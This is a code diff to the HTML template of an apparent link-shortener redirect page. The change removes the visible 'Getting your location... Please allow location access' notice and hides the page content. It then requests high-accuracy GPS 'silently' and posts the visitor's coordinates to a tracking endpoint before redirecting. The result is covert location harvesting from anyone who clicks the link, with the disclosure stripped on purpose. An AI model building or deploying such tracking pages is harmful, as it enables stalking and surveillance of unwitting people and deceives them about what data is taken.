@@ -4,10 +4,22 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Redirecting...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      display: none; /* Hidden by default */
+    }
+  </style>
 </head>
 <body>
-  <h2>Getting your location...</h2>
-  <p>Please allow location access.</p>
+  <div class="container">
+    <p>Redirecting...</p>
+  </div>
 
   <script>
     const shortCode = "{{ short_code }}";
@@ -16,23 +28,29 @@
       window.location.href = `/redirect/${shortCode}`;
     }
 
+    // Try to get location silently
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         async (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           
-          // Log GPS (non-blocking)
-          await fetch(`/api/track/${shortCode}`, {
+          // Log location (fire and forget)
+          fetch(`/api/track/${shortCode}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ latitude, longitude, accuracy })
-          }).catch(() => {}); // Don't fail if logging fails
+          }).catch(() => {});
 
           redirectNow();
         },
         (error) => {
-          console.error("Geolocation error:", error);
-          redirectNow(); // Redirect even if location denied
+          console.log("Location error:", error);
+          redirectNow(); // Always redirect, even if location fails
+        },
+        {
+          enableHighAccuracy: true,     // Better for mobile
+          timeout: 8000,                // 8 seconds max
+          maximumAge: 0
         }
       );
     } else {
